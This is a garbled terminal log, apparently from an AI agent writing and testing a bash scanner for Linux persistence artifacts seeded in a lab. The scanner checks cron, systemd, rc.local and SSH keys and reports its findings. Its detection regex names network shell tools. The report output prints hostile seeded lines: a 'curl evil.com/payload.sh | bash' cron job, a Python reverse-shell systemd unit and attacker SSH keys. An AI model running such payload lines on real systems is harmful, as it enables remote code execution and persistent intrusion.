+[?2004l[?2004h>   done
+[?2004l%s\n   [?2004h>   return 1
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_cron_file() {
+[?2004l$type" "$(json_esca[?2004h>   local f=$1 spool=0 n=0 line t user idx
+[?2004lh")" "$sha" "$lj" "$(json_escape [?2004h>   local -a F
+[?2004l[?2004h>   [[ $f == */spool/cron/* ]] && spool=1
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] && continue
+[?2004l[?2004h>     if is_stock_cron "$t"; then continue; fi
+[?2004l[?2004h>     user=""
+[?2004l[?2004h>     if (( spool )); then
+[?2004l[?2004h>       user=$(basename -- "$f")
+[?2004l[?2004h>     else
+[?2004l[?2004h>       read -ra F <<< "$t"
+[?2004l[?2004h>       idx=5
+[?2004l[?2004h>       [[ ${F[0]} == @* ]] && idx=1
+[?2004lexit[?2004h>       [[ -n ${F[$idx]:-} ]] && user=${F[$idx]}
+[?2004l& ech[?2004h>     fi
+[?2004l[?2004h>     if is_every_minute "$t" || is_suspicious "$t"; then
+[?2004l[?2004h>       add_record cron_job "$f" "$n" "$t" "$user"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_systemd_file() {
+[?2004l[?2004h>   local f=$1 base hidden=0 n=0 text value hitline="" hittext="" preview
+[?2004l[?2004h>   base=$(basename -- "$f")
+[?2004l[?2004h>   [[ $base == .* ]] && hidden=1
+[?2004l[?2004h>   while IFS= read -r text || [[ -n $text ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     if [[ $text =~ ^[[:space:]]*Exec(Start|StartPre|StartPost|Stop)?[[:space:]]*= ]]; then
+[?2004l[?2004h>       value=${text#*=}
+[?2004l[?2004h>       value=${value#"${value%%[![:space:]]*}"}
+[?2004l[?2004h>       value=${value#-}
+[?2004l[?2004h>       if [[ -z $hitline ]] && is_suspicious "$value"; then
+[?2004l[?2004h>         hitline=$n
+[?2004l[?2004h>         hittext=$text
+[?2004l[?2004h>       fi
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h>   if (( hidden )) || [[ -n $hitline ]]; then
+[?2004l[?2004h>     if [[ -n $hitline ]]; then
+[?2004l[?2004h>       preview=$hittext
+[?2004l[?2004h>     else
+[?2004l[?2004h>       preview="hidden unit file: $base"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>     add_record systemd_unit "$f" "$hitline" "$preview" ""
+[?2004l[?2004h>   fi
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_rclocal_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* || $t == "exit 0" ]] && continue
+[?2004l[?2004h>     add_record rc_local "$f" "$n" "$t" ""
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_ssh_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t user=root
+[?2004l[?2004h>   if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+[?2004l[?2004h>     user=${BASH_REMATCH[1]}
+[?2004l[?2004h>   fi
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ -n ${KNOWN[$t]:-} ]] && continue
+[?2004l[?2004h>     add_record ssh_key "$f" "$n" "$t" "$user"
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> walk_dir() {
+[?2004l[?2004h>   local d=$1 cb=$2 e r
+[?2004l[?2004h>   while IFS= read -r -d '' e; do
+[?2004l[?2004h>     r=$(resolve "$e") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done < <(find "$d" -mindepth 1 -maxdepth 1 -print0 2>/dev/null | sort -z)
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list() {
+[?2004l[?2004h>   local cb=$1 p r
+[?2004l[?2004h>   shift
+[?2004l[?2004h>   for p in "$@"; do
+[?2004l[?2004h>     r=$(resolve "$p") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/cron.d /var/spool/cron/crontabs /app_target/etc/cron.d /app_target/var/spool/cron/crontabs; do
+[?2004l[?2004h>   walk_dir "$d" scan_cron_file
+[?2004l[?2004h> done
+[?2004l[?2004h> scan_file_list scan_cron_file /etc/crontab /app_target/etc/crontab
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/systemd/system /usr/lib/systemd/system /run/systemd/system /app_target/etc/systemd/system /app_target/usr/lib/systemd/system /app_target/run/systemd/system; do
+[?2004l[?2004h>   walk_dir "$d" scan_systemd_file
+[?2004l[?2004h> done
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list scan_rclocal_file /etc/rc.local /etc/rc.d/rc.local /app_target/etc/rc.local /app_target/etc/rc.d/rc.local
+[?2004l[?2004h> scan_file_list scan_ssh_file /root/.ssh/authorized_keys /app_target/root/.ssh/authorized_keys /home/*/.ssh/authorized_keys /app_target/home/*/.ssh/authorized_keys
+[?2004l[?2004h> 
+[?2004l[?2004h> mkdir -p /app
+[?2004l[?2004h> TMP="${OUT}.tmp.$$"
+[?2004l[?2004h> SORTED=$(printf '%s' "$RECORDS" | sort -t "$SEP" -k1,1 -k2,2)
+[?2004l[?2004h> total=0; c_cron=0; c_sys=0; c_rc=0; c_ssh=0
+[?2004l[?2004h> items=""
+[?2004l[?2004h> while IFS="$SEP" read -r type path sha line preview user; do
+[?2004l[?2004h>   [[ -z $type ]] && continue
+[?2004l[?2004h>   total=$((total + 1))
+[?2004l[?2004h>   case $type in
+[?2004l[?2004h>     cron_job) c_cron=$((c_cron + 1)) ;;
+[?2004l[?2004h>     systemd_unit) c_sys=$((c_sys + 1)) ;;
+[?2004l[?2004h>     rc_local) c_rc=$((c_rc + 1)) ;;
+[?2004l[?2004h>     ssh_key) c_ssh=$((c_ssh + 1)) ;;
+[?2004l[?2004h>   esac
+[?2004l[?2004h>   lj=$line
+[?2004l[?2004h>   [[ -z $lj || $lj == null ]] && lj=null
+[?2004l[?2004h>   uj=null
+[?2004l[?2004h>   [[ -n $user ]] && uj=$(printf '"%s"' "$(json_escape "$user")")
+[?2004l[?2004h>   item=$(printf '    {\n      "type": "%s",\n      "path": "%s",\n      "sha256": "%s",\n      "details": {\n        "line_number": %s,\n        "content_preview": "%s",\n        "user": %s\n      }\n    }' "$type" "$(json_escape "$path")" "$sha" "$lj" "$(json_escape "$preview")" "$uj")
+[?2004l[?2004h>   items+=${items:+,$'\n'}$item
+[?2004l[?2004h> done <<< "$SORTED"
+[?2004l[?2004h> 
+[?2004l[?2004h> {
+[?2004l[?2004h>   printf '{\n  "summary": {\n    "total_artifacts": %d,\n    "cron_jobs": %d,\n    "systemd_units": %d,\n    "rc_local_modifications": %d,\n    "ssh_keys": %d\n  },\n  "artifacts": [' "$total" "$c_cron" "$c_sys" "$c_rc" "$c_ssh"
+[?2004l[?2004h>   if [[ -n $items ]]; then
+[?2004l[?2004h>     printf '\n%s\n  ]\n}\n' "$items"
+[?2004l[?2004h>   else
+[?2004l[?2004h>     printf ']\n}\n'
+[?2004l[?2004h>   fi
+[?2004l[?2004h> } > "$TMP"
+[?2004l[?2004h> mv -f "$TMP" "$OUT" 2>/dev/null
+[?2004l[?2004h> exit 0
+[?2004l[?2004h> EOF
+[?2004l[H[J[?2004hroot@0d5a608a53ec:/app# chmod +x /app/scan_persistence.sh && echo 'script written'
+[?2004lscript written
+[?2004hroot@0d5a608a53ec:/app# /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; python3 -m json.tool /app/persistence_report.json >/dev/null && echo JSON_VALID; grep -E '"(type|path|content_preview)"' /app/persistence_report.json
+[?2004l/app/scan_persistence.sh: line 62: syntax error in conditional expression
+/app/scan_persistence.sh: line 62: syntax error near `--report'
+/app/scan_persistence.sh: line 62: `  [[ $1 =~ ^[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+root[[:space:]]+(cd / \&\& )?(test -x /usr/sbin/anacron \|\| \( cd / \&\& )?run-parts --report /etc/cron\.(hourly|daily|weekly|monthly)\)?$ ]]'
+exit=2
+195092bf0778e35651b22391180b7de1  /app/persistence_report.json
+/app/scan_persistence.sh: line 62: syntax error in conditional expression
+/app/scan_persistence.sh: line 62: syntax error near `--report'
+/app/scan_persistence.sh: line 62: `  [[ $1 =~ ^[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+root[[:space:]]+(cd / \&\& )?(test -x /usr/sbin/anacron \|\| \( cd / \&\& )?run-parts --report /etc/cron\.(hourly|daily|weekly|monthly)\)?$ ]]'
+exit=2
+195092bf0778e35651b22391180b7de1  /app/persistence_report.json
+JSON_VALID
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/app_target/etc/cron.d/app_cron",
+        [01;31m[K"content_preview"[m[K: "0 0 * * * root /app_target/scripts/evil.sh",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/cron.d/backdoor_cron",
+        [01;31m[K"content_preview"[m[K: "* * * * * root /tmp/malicious_cron.sh",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/cron.d/backdoor_cron",
+        [01;31m[K"content_preview"[m[K: "0 2 * * * user /usr/local/bin/suspicious_backup.sh",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+        [01;31m[K"content_preview"[m[K: "17 ** * *root    cd / && run-parts --report /etc/cron.hourly",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+        [01;31m[K"content_preview"[m[K: "25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+        [01;31m[K"content_preview"[m[K: "47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+        [01;31m[K"content_preview"[m[K: "52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/var/spool/cron/crontabs/root",
+        [01;31m[K"content_preview"[m[K: "*/5 * * * * curl -s http://evil.com/payload.sh | bash",
+      [01;31m[K"type"[m[K: "rc_local",
+      [01;31m[K"path"[m[K: "/app_target/etc/rc.local",
+        [01;31m[K"content_preview"[m[K: "/tmp/startup_backdoor.sh &",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/app_target/home/victim/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8...",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/home/testuser/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/home/testuser/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8... attacker@unknown",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/root/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/root/.ssh/authorized_keys",
+        [01;31m[K"content_preview"[m[K: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/etc/systemd/system/persistence.service",
+        [01;31m[K"content_preview"[m[K: "ExecStart=/bin/bash -c \"while true; do /tmp/.hidden_backdoor.sh; sleep 60; done\"",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/usr/lib/systemd/system/.hidden_service.service",
+        [01;31m[K"content_preview"[m[K: "ExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.co",
+[?2004hroot@0d5a608a53ec:/app# clear; cat > /app/scan_persistence.sh <<'EOF'
+[?2004l[?2004h> #!/bin/bash
+[?2004l
+          *) return 0 ;;
+        esac ;;
+    esac
+  done
+  return 1
+}
+
+scan_cron_file() {
+  local f=$1 spool=0 n=0 line t user idx
+  local -a F
+  [[ $f == */spool/cron/* ]] && spool=1
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:space:]]*}"}
+    [[ -z $t || $t == "#"* ]] && continue
+    [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] && continue
+    if is_stock_cron "$t"; then continue; fi
+    user=""
+    if (( spool )); then
+      user=$(basename -- "$f")
+    else
+      read -ra F <<< "$t"
+      idx=5
+      [[ ${F[0]} == @* ]] && idx=1
+      [[ -n ${F[$idx]:-} ]] && user=${F[$idx]}
+    fi
+    if is_every_minute "$t" || is_suspicious "$t"; then
+      add_record cron_job "$f" "$n" "$t" "$user"
+    fi
+  done < "$f" 2>/dev/null
+}
+
+scan_systemd_file() {
+  local f=$1 base hidden=0 n=0 text value hitline="" hittext="" preview
+  base=$(basename -- "$f")
+  [[ $base == .* ]] && hidden=1
+  while IFS= read -r text || [[ -n $text ]]; do
+    n=$((n+1))
+    if [[ $text =~ ^[[:space:]]*Exec(Start|StartPre|StartPost|Stop)?[[:space:]]*= ]]; then
+      value=${text#*=}
+      value=${value#"${value%%[![:space:]]*}"}
+      value=${value#-}
+      if [[ -z $hitline ]] && is_suspicious "$value"; then
+        hitline=$n
+        hittext=$text
+      fi
+    fi
+  done < "$f" 2>/dev/null
+  if (( hidden )) || [[ -n $hitline ]]; then
+    if [[ -n $hitline ]]; then
+      preview=$hittext
+    else
+      preview="hidden unit file: $base"
+    fi
+    add_record systemd_unit "$f" "$hitline" "$preview" ""
+  fi
+}
+
+scan_rclocal_file() {
+  local f=$1 n=0 line t
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:space:]]*}"}
+    t=${t%"${t##*[![:space:]]}"}
+    [[ -z $t || $t == "#"* || $t == "exit 0" ]] && continue
+    add_record rc_local "$f" "$n" "$t" ""
+  done < "$f" 2>/dev/null
+}
+
+scan_ssh_file() {
+  local f=$1 n=0 line t user=root
+  if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+    user=${BASH_REMATCH[1]}
+  fi
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:space:]]*}"}
+    t=${t%[?2004h> # scan_persistence.sh - read-only scanner for seeded persistence artifacts
+[?2004l[?2004h> export LC_ALL=C
+[?2004l[?2004h> 
+[?2004l[?2004h> OUT=/app/persistence_report.json
+[?2004l[?2004h> SEP=$'\x1f'
+[?2004l[?2004h> RECORDS=""
+[?2004l[?2004h> KNOWN_KEYS_FILE=/app/known_ssh_keys.txt
+[?2004l[?2004h> declare -A SEEN=()
+[?2004l[?2004h> declare -A KNOWN=()
+[?2004l[?2004h> 
+[?2004l[?2004h> SUSP_RE='(^|[^[:alnum:]_])/(var/)?tmp(/|[^[:alnum:]_]|$)|/dev/shm|base64|eval |curl |wget |/dev/tcp|mkfifo|(^|[ |;&(])n(c|cat)( |$)|bash -i|sh -i|python[0-9.]* -c|perl -e|[|] *(ba|z)?sh|attacker|backdoor|payload|reverse'
+[?2004l[?2004h> 
+[?2004l[?2004h> if [[ -r $KNOWN_KEYS_FILE ]]; then
+[?2004l[?2004h>   while IFS= read -r k || [[ -n $k ]]; do
+[?2004l[?2004h>     [[ -n $k ]] && KNOWN["$k"]=1
+[?2004l[?2004h>   done < "$KNOWN_KEYS_FILE"
+[?2004l[?2004h> fi
+[?2004l[?2004h> 
+[?2004l[?2004h> json_escape() {
+[?2004l[?2004h>   local s=$1
+[?2004l[?2004h>   s=${s//\\/\\\\}
+[?2004l[?2004h>   s=${s//\"/\\\"}
+[?2004l_target/v[?2004h>   printf '%s' "$s"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> clean() {
+[?2004l[?2004h>   local s
+[?2004l[?2004h>   s=$(printf '%s' "$1" | tr '\t' ' ' | tr -d '[:cntrl:]')
+[?2004l[?2004h>   s=${s#"${s%%[![:space:]]*}"}
+[?2004l[?2004h>   s=${s%"${s##*[![:space:]]}"}
+[?2004l[?2004h>   printf '%s' "${s:0:100}"
+[?2004l/run/[?2004h> }
+[?2004l[?2004h> 
+[?2004ls[?2004h> add_record() {
+[?2004l[?2004h>   local type=$1 path=$2 line=$3 preview user=$5 sha
+[?2004lr/lib/syst[?2004h>   preview=$(clean "$4")
+[?2004l[?2004h>   sha=$(sha256sum -- "$path" 2>/dev/null | awk '{print $1}')
+[?2004lile
+done
+[?2004h>   [[ -z $sha ]] && return 0
+[?2004l[?2004h>   RECORDS+="${type}${SEP}${path}${SEP}${sha}${SEP}${line:-null}${SEP}${preview}${SEP}${user}"$'\n'
+[?2004lan_[?2004h> }
+[?2004lfi[?2004h> 
+[?2004ll[?2004h> resolve() {
+[?2004l[?2004h>   local r
+[?2004l[?2004h>   r=$(readlink -f -- "$1" 2>/dev/null) || return 1
+[?2004l[?2004h>   [[ -n $r && -f $r && -r $r ]] || return 1
+[?2004l[?2004h>   printf '%s' "$r"
+[?2004l[?2004h> }
+[?2004lsh[?2004h> 
+[?2004l/[?2004h> seen_once() {
+[?2004l_key[?2004h>   local key="$1|$2"
+[?2004l[?2004h>   [[ -n ${SEEN[$key]:-} ]] && return 1
+[?2004l[?2004h>   SEEN[$key]=1
+[?2004l[?2004h>   return 0
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> is_every_minute() {
+[?2004l[?2004h>   [[ $1 =~ ^([*]|[*]/1)([[:space:]]+([*]|[*]/1)){4}([[:space:]]|$) ]]
+[?2004lr t[?2004h> }
+[?2004l[?2004h> 
+[?2004lype[?2004h> is_stock_cron() {
+[?2004lpre[?2004h>   local t=$1
+[?2004l do[?2004h>   [[ $t == *"run-parts --report /etc/cron."* && $t != *tmp* && $t != *curl* && $t != *wget* ]]
+[?2004l[?2004h> }
+[?2004lcr[?2004h> 
+[?2004lo[?2004h> is_suspicious() {
+[?2004lsys[?2004h>   local t=$1 tok
+[?2004l[?2004h>   local -a toks
+[?2004l$((c_sys + 1)) ;[?2004h>   grep -Eqi -- "$SUSP_RE" <<< "$t" && return 0
+[?2004l[?2004h>   read -ra toks <<< "$t"
+[?2004l[?2004h>   for tok in "${toks[@]}"; do
+[?2004l[?2004h>     case $tok in
+[?2004l[?2004h>       /*)
+[?2004l[?2004h>         case $tok in
+[?2004l[[ -[?2004h>           /|/usr/bin/*|/bin/*|/sbin/*|/usr/sbin/*|/usr/lib/*|/usr/libexec/*|/usr/share/*|/lib/*|/etc/*|/run/*|/sysroot|/sysroot/*|/system-update|/dev/null|/proc/*|/sys/*|/var/lib/*|/var/log/*) ;;
+[?2004l\n[?2004h>           *) return 0 ;;
+[?2004l[?2004h>         esac ;;
+[?2004l: "%s",\n       [?2004h>     esac
+[?2004l[?2004h>   done
+[?2004l%s\n   [?2004h>   return 1
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_cron_file() {
+[?2004l[?2004h>   local f=$1 spool=0 n=0 line t user idx
+[?2004l[?2004h>   local -a F
+[?2004l"$preview")" [?2004h>   [[ $f == */spool/cron/* ]] && spool=1
+[?2004l:+,$'\n'}$item
+do[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l\[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] && continue
+[?2004l[?2004h>     if is_stock_cron "$t"; then continue; fi
+[?2004lrc" "$[?2004h>     user=""
+[?2004l[?2004h>     if (( spool )); then
+[?2004l[?2004h>       user=$(basename -- "$f")
+[?2004l printf '\n%s\n  ]\n}\n' "$item[?2004h>     else
+[?2004l[?2004h>       read -ra F <<< "$t"
+[?2004lf ']\n}\n'
+  fi
+[?2004h>       idx=5
+[?2004l[?2004h>       [[ ${F[0]} == @* ]] && idx=1
+[?2004lt[?2004h>       [[ -n ${F[$idx]:-} ]] && user=${F[$idx]}
+[?2004l[?2004h>     fi
+[?2004l[?2004h>     if is_every_minute "$t" || is_suspicious "$t"; then
+[?2004l[?2004h>       add_record cron_job "$f" "$n" "$t" "$user"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_systemd_file() {
+[?2004l[?2004h>   local f=$1 base hidden=0 n=0 text value hitline="" hittext="" preview
+[?2004l[?2004h>   base=$(basename -- "$f")
+[?2004l[?2004h>   [[ $base == .* ]] && hidden=1
+[?2004l[?2004h>   while IFS= read -r text || [[ -n $text ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     if [[ $text =~ ^[[:space:]]*Exec(Start|StartPre|StartPost|Stop)?[[:space:]]*= ]]; then
+[?2004l[?2004h>       value=${text#*=}
+[?2004l[?2004h>       value=${value#"${value%%[![:space:]]*}"}
+[?2004l[?2004h>       value=${value#-}
+[?2004l[?2004h>       if [[ -z $hitline ]] && is_suspicious "$value"; then
+[?2004l[?2004h>         hitline=$n
+[?2004l[?2004h>         hittext=$text
+[?2004l[?2004h>       fi
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h>   if (( hidden )) || [[ -n $hitline ]]; then
+[?2004l[?2004h>     if [[ -n $hitline ]]; then
+[?2004l[?2004h>       preview=$hittext
+[?2004l[?2004h>     else
+[?2004l[?2004h>       preview="hidden unit file: $base"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>     add_record systemd_unit "$f" "$hitline" "$preview" ""
+[?2004l[?2004h>   fi
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_rclocal_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* || $t == "exit 0" ]] && continue
+[?2004l[?2004h>     add_record rc_local "$f" "$n" "$t" ""
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_ssh_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t user=root
+[?2004l[?2004h>   if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+[?2004l[?2004h>     user=${BASH_REMATCH[1]}
+[?2004l[?2004h>   fi
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ -n ${KNOWN[$t]:-} ]] && continue
+[?2004l[?2004h>     add_record ssh_key "$f" "$n" "$t" "$user"
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> walk_dir() {
+[?2004l[?2004h>   local d=$1 cb=$2 e r
+[?2004l[?2004h>   while IFS= read -r -d '' e; do
+[?2004l[?2004h>     r=$(resolve "$e") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done < <(find "$d" -mindepth 1 -maxdepth 1 -print0 2>/dev/null | sort -z)
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list() {
+[?2004l[?2004h>   local cb=$1 p r
+[?2004l[?2004h>   shift
+[?2004l[?2004h>   for p in "$@"; do
+[?2004l[?2004h>     r=$(resolve "$p") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/cron.d /var/spool/cron/crontabs /app_target/etc/cron.d /app_target/var/spool/cron/crontabs; do
+[?2004l[?2004h>   walk_dir "$d" scan_cron_file
+[?2004l[?2004h> done
+[?2004l[?2004h> scan_file_list scan_cron_file /etc/crontab /app_target/etc/crontab
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/systemd/system /usr/lib/systemd/system /run/systemd/system /app_target/etc/systemd/system /app_target/usr/lib/systemd/system /app_target/run/systemd/system; do
+[?2004l[?2004h>   walk_dir "$d" scan_systemd_file
+[?2004l[?2004h> done
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list scan_rclocal_file /etc/rc.local /etc/rc.d/rc.local /app_target/etc/rc.local /app_target/etc/rc.d/rc.local
+[?2004l[?2004h> scan_file_list scan_ssh_file /root/.ssh/authorized_keys /app_target/root/.ssh/authorized_keys /home/*/.ssh/authorized_keys /app_target/home/*/.ssh/authorized_keys
+[?2004l[?2004h> 
+[?2004l[?2004h> mkdir -p /app
+[?2004l[?2004h> TMP="${OUT}.tmp.$$"
+[?2004l[?2004h> SORTED=$(printf '%s' "$RECORDS" | sort -t "$SEP" -k1,1 -k2,2)
+[?2004l[?2004h> total=0; c_cron=0; c_sys=0; c_rc=0; c_ssh=0
+[?2004l[?2004h> items=""
+[?2004l[?2004h> while IFS="$SEP" read -r type path sha line preview user; do
+[?2004l[?2004h>   [[ -z $type ]] && continue
+[?2004l[?2004h>   total=$((total + 1))
+[?2004l[?2004h>   case $type in
+[?2004l[?2004h>     cron_job) c_cron=$((c_cron + 1)) ;;
+[?2004l[?2004h>     systemd_unit) c_sys=$((c_sys + 1)) ;;
+[?2004l[?2004h>     rc_local) c_rc=$((c_rc + 1)) ;;
+[?2004l[?2004h>     ssh_key) c_ssh=$((c_ssh + 1)) ;;
+[?2004l[?2004h>   esac
+[?2004l[?2004h>   lj=$line
+[?2004l[?2004h>   [[ -z $lj || $lj == null ]] && lj=null
+[?2004l[?2004h>   uj=null
+[?2004l[?2004h>   [[ -n $user ]] && uj=$(printf '"%s"' "$(json_escape "$user")")
+[?2004l[?2004h>   item=$(printf '    {\n      "type": "%s",\n      "path": "%s",\n      "sha256": "%s",\n      "details": {\n        "line_number": %s,\n        "content_preview": "%s",\n        "user": %s\n      }\n    }' "$type" "$(json_escape "$path")" "$sha" "$lj" "$(json_escape "$preview")" "$uj")
+[?2004l[?2004h>   items+=${items:+,$'\n'}$item
+[?2004l[?2004h> done <<< "$SORTED"
+[?2004l[?2004h> 
+[?2004l[?2004h> {
+[?2004l[?2004h>   printf '{\n  "summary": {\n    "total_artifacts": %d,\n    "cron_jobs": %d,\n    "systemd_units": %d,\n    "rc_local_modifications": %d,\n    "ssh_keys": %d\n  },\n  "artifacts": [' "$total" "$c_cron" "$c_sys" "$c_rc" "$c_ssh"
+[?2004l[?2004h>   if [[ -n $items ]]; then
+[?2004l[?2004h>     printf '\n%s\n  ]\n}\n' "$items"
+[?2004l[?2004h>   else
+[?2004l[?2004h>     printf ']\n}\n'
+[?2004l[?2004h>   fi
+[?2004l[?2004h> } > "$TMP"
